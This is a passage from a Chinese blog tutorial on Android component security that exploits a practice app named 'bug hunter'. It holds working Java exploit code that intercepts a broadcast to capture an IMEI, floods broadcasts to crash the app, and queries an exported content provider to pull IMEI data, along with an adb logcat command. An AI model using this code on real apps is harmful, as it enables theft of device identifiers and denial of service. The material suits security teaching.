+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">MyBroadcast</span> <span class="keyword">extends</span> <span class="title">BroadcastReceiver</span> </span>&#123;</span><br><span class="line">    <span class="meta">@SuppressLint</span>(&#123;<span class="string">"WrongConstant"</span>, <span class="string">"ShowToast"</span>&#125;)</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">onReceive</span><span class="params">(Context param1Context, Intent param1Intent)</span> </span>&#123;</span><br><span class="line">        Toast.makeText(MainActivity.<span class="keyword">this</span>, <span class="string">"get it"</span>, <span class="number">0</span>).show();</span><br><span class="line">        Log.i(<span class="string">"bughunter"</span>, Objects.requireNonNull(param1Intent.getStringExtra(<span class="string">"imei"</span>)));</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title">registBroad</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    registerReceiver(<span class="keyword">new</span> MyBroadcast(), <span class="keyword">new</span> IntentFilter(<span class="string">"broadcast"</span>));</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">@Override</span></span><br><span class="line"><span class="function"><span class="keyword">protected</span> <span class="keyword">void</span> <span class="title">onCreate</span><span class="params">(Bundle savedInstanceState)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">super</span>.onCreate(savedInstanceState);</span><br><span class="line">    setContentView(R.layout.activity_main);</span><br><span class="line">    registBroad();</span><br><span class="line">    <span class="comment">//send_null();</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>点击bug hunter的发送广播按钮，即可收到私有数据“imei”码。</p>
+<div align="left"><img src="/2020/07/21/20200721Android%E5%AE%89%E5%85%A8%E4%B9%8B%E7%BB%84%E4%BB%B6%E5%AE%89%E5%85%A8/5.png" alt="5" style="zoom:60%;">
+
+<p>创建发送空数据广播的函数send_null如下。</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title">send_null</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="keyword">while</span>(<span class="keyword">true</span>)&#123;</span><br><span class="line">        Intent intent = <span class="keyword">new</span> Intent(<span class="string">"broadcast"</span>);</span><br><span class="line">        MainActivity.<span class="keyword">this</span>.sendBroadcast(intent);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">@Override</span></span><br><span class="line"><span class="function"><span class="keyword">protected</span> <span class="keyword">void</span> <span class="title">onCreate</span><span class="params">(Bundle savedInstanceState)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">super</span>.onCreate(savedInstanceState);</span><br><span class="line">    setContentView(R.layout.activity_main);</span><br><span class="line">    <span class="comment">//registBroad();</span></span><br><span class="line">    send_null();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>由于bug hunter一直保持接收广播的状态，一运行发送空广播的函数，即可看到bug hunter停止运行crash。</p>
+<div align="left"><img src="/2020/07/21/20200721Android%E5%AE%89%E5%85%A8%E4%B9%8B%E7%BB%84%E4%BB%B6%E5%AE%89%E5%85%A8/6.png" alt="6" style="zoom:60%;">
+
+<p>由于未注销广播可以导致intent泄露，反复打开当前界面，利用adb的logcat命令</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">adb logcat | grep -E *leak* &gt; 2.txt</span><br></pre></td></tr></table></figure>
+
+<p>可以获取当前的含有leak的泄露日志，如下图所示。</p>
+<div align="left"><img src="/2020/07/21/20200721Android%E5%AE%89%E5%85%A8%E4%B9%8B%E7%BB%84%E4%BB%B6%E5%AE%89%E5%85%A8/7.png" alt="7" style="zoom:60%;">
+
+<h2 id="6-Provider组件暴露"><a href="#6-Provider组件暴露" class="headerlink" title="6. Provider组件暴露"></a>6. Provider组件暴露</h2><h3 id="漏洞利用的目的：-5"><a href="#漏洞利用的目的：-5" class="headerlink" title="漏洞利用的目的："></a>漏洞利用的目的：</h3><p>获取当前组件写入暴露provider组件的个人数据。</p>
+<h3 id="漏洞利用过程：-5"><a href="#漏洞利用过程：-5" class="headerlink" title="漏洞利用过程："></a>漏洞利用过程：</h3><p>根据反编译可以看出，provider处理的query操作。</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> Cursor <span class="title">query</span><span class="params">(Uri paramUri, String[] paramArrayOfString1, String paramString1, String[] paramArrayOfString2, String paramString2)</span> </span>&#123;</span><br><span class="line">    SQLiteDatabase sQLiteDatabase = <span class="keyword">this</span>.myDbHelper.getReadableDatabase();</span><br><span class="line">    <span class="keyword">if</span> (MATCHER.match(paramUri) == <span class="number">1</span>)</span><br><span class="line">        <span class="keyword">return</span> sQLiteDatabase.query(<span class="string">"info"</span>, paramArrayOfString1, paramString1, paramArrayOfString2, <span class="keyword">null</span>, <span class="keyword">null</span>, paramString2); </span><br><span class="line">    StringBuilder stringBuilder = <span class="keyword">new</span> StringBuilder();</span><br><span class="line">    stringBuilder.append(<span class="string">"Unkwon Uri:"</span>);</span><br><span class="line">    stringBuilder.append(paramUri.toString());</span><br><span class="line">    <span class="keyword">throw</span> <span class="keyword">new</span> IllegalArgumentException(stringBuilder.toString());</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>又根据反编译的代码获得URI和目录。</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">MATCHER.addURI(<span class="string">"com.example.bughunter.ComponentSecurity.ExportProvider"</span>, <span class="string">"info"</span>, <span class="number">1</span>);</span><br></pre></td></tr></table></figure>
+
+<p>由此编写获取数据库个人数据的代码。</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">MainActivity</span> <span class="keyword">extends</span> <span class="title">AppCompatActivity</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">protected</span> <span class="keyword">void</span> <span class="title">onCreate</span><span class="params">(Bundle savedInstanceState)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">super</span>.onCreate(savedInstanceState);</span><br><span class="line">        setContentView(R.layout.activity_main);</span><br><span class="line">        <span class="keyword">while</span>(<span class="keyword">true</span>)&#123;</span><br><span class="line">            get_Imei();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title">get_Imei</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        ContentResolver contentResolver = getContentResolver();</span><br><span class="line">        Cursor cursor = contentResolver.query(Uri.parse(<span class="string">"content://com.example.bughunter.ComponentSecurity.ExportProvider/info"</span>),</span><br><span class="line">                                              <span class="keyword">new</span> String[]&#123;<span class="string">"imei"</span>&#125;, <span class="keyword">null</span>, <span class="keyword">null</span>, <span class="keyword">null</span>);</span><br><span class="line">        <span class="keyword">if</span> (cursor != <span class="keyword">null</span>) &#123;</span><br><span class="line">            <span class="keyword">while</span>(cursor.moveToNext())&#123;</span><br><span class="line">                String a = cursor.getString(<span class="number">0</span>);</span><br><span class="line">                System.out.println(<span class="string">"imei="</span>+a);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>运行代码，即可在系统输出中看到“imei”。</p>
+<div align="left"><img src="/2020/07/21/20200721Android%E5%AE%89%E5%85%A8%E4%B9%8B%E7%BB%84%E4%BB%B6%E5%AE%89%E5%85%A8/8.png" alt="8" style="zoom:60%;">
+
+<h2 id="7-附加知识"><a href="#7-附加知识" class="headerlink" title="7. 附加知识"></a>7. 附加知识</h2><ul>
+<li>查询手机imei码的方法，拨号输入*#06#，即可看到本机imei码。</li>
+</ul>
+<div align="left"><img src="/2020/07/21/20200721Android%E5%AE%89%E5%85%A8%E4%B9%8B%E7%BB%84%E4%BB%B6%E5%AE%89%E5%85%A8/9.png" alt="9" style="zoom:60%;"></div></div></div></div></div></div></div></div></div>
+      
+    </div>
+    
+    
+    
+
+    
+
+    
+
+    
+
+    <footer class="post-footer">
+      
+        <div class="post-tags">
+          
+            <a href="/tags/%E7%BB%84%E4%BB%B6%E5%AE%89%E5%85%A8/" rel="tag"># 组件安全</a>
+          
+            <a href="/tags/android/" rel="tag"># android</a>
+          
+            <a href="/tags/security/" rel="tag"># security</a>
+          
+        </div>
+      
+
+      
+      
+      
+
+      
+        <div class="post-nav">
+          <div class="post-nav-next post-nav-item">
+            
+              <a href="/2020/07/15/android-security/" rel="next" title="android_security">
+                <i class="fa fa-chevron-left"></i> android_security
+              </a>
+            
+          </div>
+
+          <span class="post-nav-divider"></span>
+
+          <div class="post-nav-prev post-nav-item">
+            
+          </div>
+        </div>
+      
+
+      
+      
+    </footer>
+  </div>
+  
+  
+  
+  </article>
+
+
+
+    <div class="post-spread">
+      
+    </div>
+  </div>
+
+
+          </div>
+          
+
+
+          
+
+  
+    <div class="comments" id="comments">
+    </div>
+  
+
+
+
+        </div>
+        
+          
+  
+  <div class="sidebar-toggle">
+    <div class="sidebar-toggle-line-wrap">
+      <span class="sidebar-toggle-line sidebar-toggle-line-first"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-middle"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-last"></span>
+    </div>
+  </div>
+
+  <aside id="sidebar" class="sidebar">
+    
+    <div class="sidebar-inner">
+
+      
+
+      
+        <ul class="sidebar-nav motion-element">
+          <li class="sidebar-nav-toc sidebar-nav-active" data-target="post-toc-wrap">
+            文章目录
+          </li>
+          <li class="sidebar-nav-overview" data-target="site-overview-wrap">
+            站点概览
+          </li>
+        </ul>
+      
+
+      <section class="site-overview-wrap sidebar-panel">
+        <div class="site-overview">
+          <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+            
+              <img class="site-author-image" itemprop="image"
+                src="/images/header.jpg"
+                alt="Peng Zhang" />
+            
+              <p class="site-author-name" itemprop="name">Peng Zhang</p>
+              <p class="site-description motion-element" itemprop="description"></p>
+          </div>
+
+          <nav class="site-state motion-element">
+
+            
+              <div class="site-state-item site-state-posts">
+                <a href="/archives">
+                  <span class="site-state-item-count">17</span>
+                  <span class="site-state-item-name">日志</span>
+                </a>
+              </div>
+            
+
+            
+              
+              
+              <div class="site-state-item site-state-categories">
+                <a href="/categories/index.html">
+                  <span class="site-state-item-count">11</span>
+                  <span class="site-state-item-name">分类</span>
+                </a>
+              </div>
+            
+
+            
+              
+              
+              <div class="site-state-item site-state-tags">
+                <a href="/tags/index.html">
+                  <span class="site-state-item-count">28</span>
+                  <span class="site-state-item-name">标签</span>
+                </a>
+              </div>
+            
+
+          </nav>
+
+          
+
+          
+            <div class="links-of-author motion-element">
+                
+                  <span class="links-of-author-item">
+                    <a href="https://github.com/sbtger" target="_blank" title="GitHub">
+                      
+                        <i class="fa fa-fw fa-github"></i>GitHub</a>
+                  </span>
+                
+                  <span class="links-of-author-item">
+                    <a href="mailto:zpandy999@163.com" target="_blank" title="E-Mail">
+                      
+                        <i class="fa fa-fw fa-envelope"></i>E-Mail</a>
+                  </span>
+                
+            </div>
+          
+
+          
+          
+
+          
+          
+
+          
+
+        </div>
+      </section>
+
+      
+      <!--noindex-->
+        <section class="post-toc-wrap motion-element sidebar-panel sidebar-panel-active">
+          <div class="post-toc">
+
+            
+              
+            
+
+            
+              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#Android-安全之组件安全"><span class="nav-number">1.</span> <span class="nav-text">Android 安全之组件安全</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#1-暴露Activity组件"><span class="nav-number">1.1.</span> <span class="nav-text">1. 暴露Activity组件</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#漏洞利用的目的："><span class="nav-number">1.1.1.</span> <span class="nav-text">漏洞利用的目的：</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#漏洞利用过程："><span class="nav-number">1.1.2.</span> <span class="nav-text">漏洞利用过程：</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#2-暴露Service组件"><span class="nav-number">1.2.</span> <span class="nav-text">2. 暴露Service组件</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#漏洞利用的目的：-1"><span class="nav-number">1.2.1.</span> <span class="nav-text">漏洞利用的目的：</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#漏洞利用过程：-1"><span class="nav-number">1.2.2.</span> <span class="nav-text">漏洞利用过程：</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#3-暴露Broadcast组件"><span class="nav-number">1.3.</span> <span class="nav-text">3. 暴露Broadcast组件</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#漏洞利用的目的：-2"><span class="nav-number">1.3.1.</span> <span class="nav-text">漏洞利用的目的：</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#漏洞利用过程：-2"><span class="nav-number">1.3.2.</span> <span class="nav-text">漏洞利用过程：</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#4-组件劫持"><span class="nav-number">1.4.</span> <span class="nav-text">4. 组件劫持</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#漏洞利用的目的：-3"><span class="nav-number">1.4.1.</span> <span class="nav-text">漏洞利用的目的：</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#漏洞利用过程：-3"><span class="nav-number">1.4.2.</span> <span class="nav-text">漏洞利用过程：</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#5-动态注册广播"><span class="nav-number">1.5.</span> <span class="nav-text">5. 动态注册广播</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#漏洞利用的目的：-4"><span class="nav-number">1.5.1.</span> <span class="nav-text">漏洞利用的目的：</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#漏洞利用过程：-4"><span class="nav-number">1.5.2.</span> <span class="nav-text">漏洞利用过程：</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#6-Provider组件暴露"><span class="nav-number">1.6.</span> <span class="nav-text">6. Provider组件暴露</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#漏洞利用的目的：-5"><span class="nav-number">1.6.1.</span> <span class="nav-text">漏洞利用的目的：</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#漏洞利用过程：-5"><span class="nav-number">1.6.2.</span> <span class="nav-text">漏洞利用过程：</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#7-附加知识"><span class="nav-number">1.7.</span> <span class="nav-text">7. 附加知识</span></a></li></ol></li></ol></div>
+            
+
+          </div>
+        </section>
+      <!--/noindex-->
+      
+
+      
+
+    </div>
+  </aside>
+
+
+        
+      </div>
+    </main>
+
+    <footer id="footer" class="footer">
+      <div class="footer-inner">
+        <div class="copyright">&copy; <span itemprop="copyrightYear">2020</span>
+  <span class="with-love">
+    <i class="fa fa-user"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">Peng Zhang</span>
+
+  
+    <span class="post-meta-divider">|</span>
+    <span class="post-meta-item-icon">
+      <i class="fa fa-area-chart"></i>
+    </span>
+    
+      <span class="post-meta-item-text">Site words total count&#58;</span>
+    
+    <span title="Site words total count">12.7k</span>
+  
+</div>
+
+
+  <div class="powered-by">由 <a class="theme-link" target="_blank" href="https://hexo.io">Hexo</a> 强力驱动</div>
+
+
+
+  <span class="post-meta-divider">|</span>
+
+
+
+  <div class="theme-info">主题 &mdash; <a class="theme-link" target="_blank" href="https://github.com/iissnan/hexo-theme-next">NexT.Gemini</a> v5.1.4</div>
+
+
+
+
+<span id="busuanzi_container_site_pv" class="theme-info">
+&nbsp;&nbsp;|&nbsp;&nbsp;访问量<span id="busuanzi_value_site_pv"></span>
+  </span>
+  <span id="busuanzi_container_site_uv" class="theme-info">
+&nbsp;&nbsp;|&nbsp;&nbsp;访客<span id="busuanzi_value_site_uv"></span>
+  </span>
+
+<script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+
+        
+
+
+
+
+
+
+        
+      </div>
+    </footer>
+
+    
+      <div class="back-to-top">
+        <i class="fa fa-arrow-up"></i>
+        
+          <span id="scrollpercent"><span>0</span>%</span>
+        
+      </div>
+    
+
+    
+
+  </div>
+
+  
+
+<script type="text/javascript">
+  if (Object.prototype.toString.call(window.Promise) !== '[object Function]') {
+    window.Promise = null;
+  }
+</script>
+
+
+
+
+
+
+
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+
+  
+  
+    <script type="text/javascript" src="/lib/jquery/index.js?v=2.1.3"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/fastclick/lib/fastclick.min.js?v=1.0.6"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/jquery_lazyload/jquery.lazyload.js?v=1.9.7"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/velocity/velocity.min.js?v=1.2.1"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/velocity/velocity.ui.min.js?v=1.2.1"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/fancybox/source/jquery.fancybox.pack.js?v=2.1.5"></script>
+  
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/utils.js?v=5.1.4"></script>
+
+  <script type="text/javascript" src="/js/src/motion.js?v=5.1.4"></script>
+
+
+
+  
+  
+
+
+  <script type="text/javascript" src="/js/src/affix.js?v=5.1.4"></script>
+
+  <script type="text/javascript" src="/js/src/schemes/pisces.js?v=5.1.4"></script>
+
+
+
+  
+  <script type="text/javascript" src="/js/src/scrollspy.js?v=5.1.4"></script>
+<script type="text/javascript" src="/js/src/post-details.js?v=5.1.4"></script>
+
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/bootstrap.js?v=5.1.4"></script>
+
+
+
+  
+
+
+  
+
+
+
+
+	
+
+
+
+
+
+  
+
+
+
+
+
+  
+
+
+
+
+
+
+
+
+
+
+  <script src="//cdn1.lncld.net/static/js/3.0.4/av-min.js"></script>
+  <script src="//unpkg.com/valine/dist/Valine.min.js"></script>
+  
+  <script type="text/javascript">
+    var GUEST = ['nick','mail','link'];
+    var guest = 'nick,mail,link';
+    guest = guest.split(',').filter(item=>{
+      return GUEST.indexOf(item)>-1;
+    });
+    new Valine({
+        el: '#comments' ,
+        verify: false,
+        notify: true,
+        appId: 'uVnlBrG3gVIsFVLuKwa2GqEk-gzGzoHsz',
+        appKey: 'mcV530t0xWmBXhLDzUOPj2qg',
+        placeholder: '请留言~',
+        avatar:'mm',
+        guest_info:guest,
+        pageSize:'10' || 10,
+    });
+  </script>
+
+
+
+  
+
+  <script type="text/javascript">
+    // Popup Window;
+    var isfetched = false;
+    var isXml = true;
+    // Search DB path;
+    var search_path = "search.xml";
+    if (search_path.length === 0) {
+      search_path = "search.xml";
+    } else if (/json$/i.test(search_path)) {
+      isXml = false;
+    }
+    var path = "/" + search_path;
+    // monitor main search box;
+
+    var onPopupClose = function (e) {
+      $('.popup').hide();
+      $('#local-search-input').val('');
+      $('.search-result-list').remove();
+      $('#no-result').remove();
+      $(".local-search-pop-overlay").remove();
+      $('body').css('overflow', '');
+    }
+
+    function proceedsearch() {
+      $("body")
+        .append('<div class="search-popup-overlay local-search-pop-overlay"></div>')
+        .css('overflow', 'hidden');
+      $('.search-popup-overlay').click(onPopupClose);
+      $('.popup').toggle();
+      var $localSearchInput = $('#local-search-input');
+      $localSearchInput.attr("autocapitalize", "none");
+      $localSearchInput.attr("autocorrect", "off");
+      $localSearchInput.focus();
+    }
+
+    // search function;
+    var searchFunc = function(path, search_id, content_id) {
+      'use strict';
+
+      // start loading animation
+      $("body")
+        .append('<div class="search-popup-overlay local-search-pop-overlay">' +
+          '<div id="search-loading-icon">' +
+          '<i class="fa fa-spinner fa-pulse fa-5x fa-fw"></i>' +
+          '</div>' +
+          '</div>')
+        .css('overflow', 'hidden');
+      $("#search-loading-icon").css('margin', '20% auto 0 auto').css('text-align', 'center');
+
+      $.ajax({
+        url: path,
+        dataType: isXml ? "xml" : "json",
+        async: true,
+        success: function(res) {
+          // get the contents from search data
+          isfetched = true;
+          $('.popup').detach().appendTo('.header-inner');
+          var datas = isXml ? $("entry", res).map(function() {
+            return {
+              title: $("title", this).text(),
+              content: $("content",this).text(),
+              url: $("url" , this).text()
+            };
+          }).get() : res;
+          var input = document.getElementById(search_id);
+          var resultContent = document.getElementById(content_id);
+          var inputEventFunction = function() {
+            var searchText = input.value.trim().toLowerCase();
+            var keywords = searchText.split(/[\s\-]+/);
+            if (keywords.length > 1) {
+              keywords.push(searchText);
+            }
+            var resultItems = [];
+            if (searchText.length > 0) {
+              // perform local searching
+              datas.forEach(function(data) {
+                var isMatch = false;
+                var hitCount = 0;
+                var searchTextCount = 0;
+                var title = data.title.trim();
+                var titleInLowerCase = title.toLowerCase();
+                var content = data.content.trim().replace(/<[^>]+>/g,"");
+                var contentInLowerCase = content.toLowerCase();
+                var articleUrl = decodeURIComponent(data.url);
+                var indexOfTitle = [];
+                var indexOfContent = [];
+                // only match articles with not empty titles
+                if(title != '') {
+                  keywords.forEach(function(keyword) {
+                    function getIndexByWord(word, text, caseSensitive) {
+                      var wordLen = word.length;
+                      if (wordLen === 0) {
+                        return [];
+                      }
+                      var startPosition = 0, position = [], index = [];
+                      if (!caseSensitive) {
+                        text = text.toLowerCase();
+                        word = word.toLowerCase();
+                      }
+                      while ((position = text.indexOf(word, startPosition)) > -1) {
+                        index.push({position: position, word: word});
+                        startPosition = position + wordLen;
+                      }
+                      return index;
+                    }
+
+                    indexOfTitle = indexOfTitle.concat(getIndexByWord(keyword, titleInLowerCase, false));
+                    indexOfContent = indexOfContent.concat(getIndexByWord(keyword, contentInLowerCase, false));
+                  });
+                  if (indexOfTitle.length > 0 || indexOfContent.length > 0) {
+                    isMatch = true;
+                    hitCount = indexOfTitle.length + indexOfContent.length;
+                  }
+                }
+
+                // show search results
+
+                if (isMatch) {
+                  // sort index by position of keyword
+
+                  [indexOfTitle, indexOfContent].forEach(function (index) {
+                    index.sort(function (itemLeft, itemRight) {
+                      if (itemRight.position !== itemLeft.position) {
+                        return itemRight.position - itemLeft.position;
+                      } else {
+                        return itemLeft.word.length - itemRight.word.length;
+                      }
+                    });
+                  });
+
+                  // merge hits into slices
+
+                  function mergeIntoSlice(text, start, end, index) {
+                    var item = index[index.length - 1];
+                    var position = item.position;
+                    var word = item.word;
+                    var hits = [];
+                    var searchTextCountInSlice = 0;
+                    while (position + word.length <= end && index.length != 0) {
+                      if (word === searchText) {
+                        searchTextCountInSlice++;
+                      }
+                      hits.push({position: position, length: word.length});
+                      var wordEnd = position + word.length;
+
+                      // move to next position of hit
+
+                      index.pop();
+                      while (index.length != 0) {
+                        item = index[index.length - 1];
+                        position = item.position;
+                        word = item.word;
+                        if (wordEnd > position) {
+                          index.pop();
+                        } else {
+                          break;
+                        }
+                      }
+                    }
+                    searchTextCount += searchTextCountInSlice;
+                    return {
+                      hits: hits,
+                      start: start,
+                      end: end,
+                      searchTextCount: searchTextCountInSlice
+                    };
+                  }
+
+                  var slicesOfTitle = [];
+                  if (indexOfTitle.length != 0) {
+                    slicesOfTitle.push(mergeIntoSlice(title, 0, title.length, indexOfTitle));
+                  }
+
+                  var slicesOfContent = [];
+                  while (indexOfContent.length != 0) {
+                    var item = indexOfContent[indexOfContent.length - 1];
+                    var position = item.position;
+                    var word = item.word;
+                    // cut out 100 characters
+                    var start = position - 20;
+                    var end = position + 80;
+                    if(start < 0){
+                      start = 0;
+                    }
+                    if (end < position + word.length) {
+                      end = position + word.length;
+                    }
+                    if(end > content.length){
+                      end = content.length;
+                    }
+                    slicesOfContent.push(mergeIntoSlice(content, start, end, indexOfContent));
+                  }
+
+                  // sort slices in content by search text's count and hits' count
+
+                  slicesOfContent.sort(function (sliceLeft, sliceRight) {
+                    if (sliceLeft.searchTextCount !== sliceRight.searchTextCount) {
+                      return sliceRight.searchTextCount - sliceLeft.searchTextCount;
+                    } else if (sliceLeft.hits.length !== sliceRight.hits.length) {
+                      return sliceRight.hits.length - sliceLeft.hits.length;
+                    } else {
+                      return sliceLeft.start - sliceRight.start;
+                    }
+                  });
+
+                  // select top N slices in content
+
+                  var upperBound = parseInt('1');
+                  if (upperBound >= 0) {
+                    slicesOfContent = slicesOfContent.slice(0, upperBound);
+                  }
+
+                  // highlight title and content
+
+                  function highlightKeyword(text, slice) {
+                    var result = '';
+                    var prevEnd = slice.start;
+                    slice.hits.forEach(function (hit) {
+                      result += text.substring(prevEnd, hit.position);
+                      var end = hit.position + hit.length;
+                      result += '<b class="search-keyword">' + text.substring(hit.position, end) + '</b>';
+                      prevEnd = end;
+                    });
+                    result += text.substring(prevEnd, slice.end);
+                    return result;
+                  }
+
+                  var resultItem = '';
+
+                  if (slicesOfTitle.length != 0) {
+                    resultItem += "<li><a href='" + articleUrl + "' class='search-result-title'>" + highlightKeyword(title, slicesOfTitle[0]) + "</a>";
+                  } else {
+                    resultItem += "<li><a href='" + articleUrl + "' class='search-result-title'>" + title + "</a>";
+                  }
+
+                  slicesOfContent.forEach(function (slice) {
+                    resultItem += "<a href='" + articleUrl + "'>" +
+                      "<p class=\"search-result\">" + highlightKeyword(content, slice) +
+                      "...</p>" + "</a>";
+                  });
+
+                  resultItem += "</li>";
+                  resultItems.push({
+                    item: resultItem,
+                    searchTextCount: searchTextCount,
+                    hitCount: hitCount,
+                    id: resultItems.length
+                  });
+                }
+              })
+            };
+            if (keywords.length === 1 && keywords[0] === "") {
+              resultContent.innerHTML = '<div id="no-result"><i class="fa fa-search fa-5x" /></div>'
+            } else if (resultItems.length === 0) {
+              resultContent.innerHTML = '<div id="no-result"><i class="fa fa-frown-o fa-5x" /></div>'
+            } else {
+              resultItems.sort(function (resultLeft, resultRight) {
+                if (resultLeft.searchTextCount !== resultRight.searchTextCount) {
+                  return resultRight.searchTextCount - resultLeft.searchTextCount;
+                } else if (resultLeft.hitCount !== resultRight.hitCount) {
+                  return resultRight.hitCount - resultLeft.hitCount;
+                } else {
+                  return resultRight.id - resultLeft.id;
+                }
+              });
+              var searchResultList = '<ul class=\"search-result-list\">';
+              resultItems.forEach(function (result) {
+                searchResultList += result.item;
+              })
+              searchResultList += "</ul>";
+              resultContent.innerHTML = searchResultList;
+            }
+          }
+
+          if ('auto' === 'auto') {
+            input.addEventListener('input', inputEventFunction);
+          } else {
+            $('.search-icon').click(inputEventFunction);
+            input.addEventListener('keypress', function (event) {
+              if (event.keyCode === 13) {
+                inputEventFunction();
+              }
+            });
+          }
+
+          // remove loading animation
+          $(".local-search-pop-overlay").remove();
+          $('body').css('overflow', '');
+
+          proceedsearch();
+        }
+      });
+    }
+
+    // handle and trigger popup window;
+    $('.popup-trigger').click(function(e) {
+      e.stopPropagation();
+      if (isfetched === false) {
+        searchFunc(path, 'local-search-input', 'local-search-result');
+      } else {
+        proceedsearch();
+      };
+    });
+
+    $('.popup-btn-close').click(onPopupClose);
+    $('.popup').click(function(e){
+      e.stopPropagation();
+    });
+    $(document).on('keyup', function (event) {
+      var shouldDismissSearchPopup = event.which === 27 &&
+        $('.search-popup').is(':visible');
+      if (shouldDismissSearchPopup) {
+        onPopupClose();
+      }
+    });
+  </script>
+
+
+
+
+
+  
+  
+  <script>
+    
+    function addCount(Counter) {
+      var $visitors = $('.leancloud_visitors');
+      var url = $visitors.attr('id').trim();
+      var title = $visitors.attr('data-flag-title').trim();
+
+      Counter('get', '/classes/Counter', { where: JSON.stringify({ url }) })
+        .done(function({ results }) {
+          if (results.length > 0) {
+            var counter = results[0];
+            
+            Counter('put', '/classes/Counter/' + counter.objectId, JSON.stringify({ time: { '__op': 'Increment', 'amount': 1 } }))
+            
+              .done(function() {
+                var $element = $(document.getElementById(url));
